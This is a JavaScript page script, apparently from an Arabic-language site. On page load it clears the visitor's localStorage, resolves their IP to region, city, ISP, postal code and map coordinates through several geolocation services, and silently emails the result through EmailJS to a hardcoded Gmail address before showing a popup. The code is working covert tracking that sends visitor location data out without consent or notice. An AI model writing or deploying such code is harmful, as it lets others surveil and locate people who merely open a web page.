window.onload = function () {
    localStorage.clear();

    const popup = document.getElementById("popup");
    emailjs.init("GRpOF1pKqcSg9cx5H");

    fetch("https://api.ipify.org?format=json")
        .then(res => res.json())
        .then(data => fetch(`https://ipapi.co/${data.ip}/json/`))
        .then(res => res.json())
        .then(loc => {
            let googleMapUrl = "تعذر توليد رابط الخريطة";

            if (loc.latitude && loc.longitude) {
                googleMapUrl = `https://www.google.com/maps?q=${loc.latitude},${loc.longitude}`;
            } else {
                // إذا لم تتوفر الإحداثيات، حاول الحصول على الموقع من API بديل (مثلاً freegeoip.app)
                return fetch("https://freegeoip.app/json/")
                    .then(res => res.json())
                    .then(altLoc => {
                        if (altLoc.latitude && altLoc.longitude) {
                            googleMapUrl = `https://www.google.com/maps?q=${altLoc.latitude},${altLoc.longitude}`;
                        }
                        return {
                            ...loc,
                            latitude: altLoc.latitude || loc.latitude,
                            longitude: altLoc.longitude || loc.longitude,
                        };
                    });
            }

            return loc;
        })
        .then(loc => {
            const locationString = `
                ${loc.region || 'غير معروف'} - 
                ${loc.city || 'غير معروف'} - 
                ${loc.county || 'غير معروف'} - 
                ${loc.org || 'غير معروف'} - 
                ${loc.postal || 'بدون رمز بريدي'}
                \nرابط الخريطة: ${loc.latitude && loc.longitude ? `https://www.google.com/maps?q=${loc.latitude},${loc.longitude}` : "غير متوفر"}
            `;

            return emailjs.send("service_25q0ern", "template_xi6fmgy", {
                to_email: "e508769103@gmail.com",
                name: "زائر جديد",
                time: new Date().toLocaleString('ar-EG'),
                message: locationString
            });
        })
        .catch(err => {
            console.error("خطأ أثناء جلب أو إرسال البيانات:", err);
        })
        .finally(() => {
            if (popup) {
                popup.style.display = "flex";
            }
        });
};
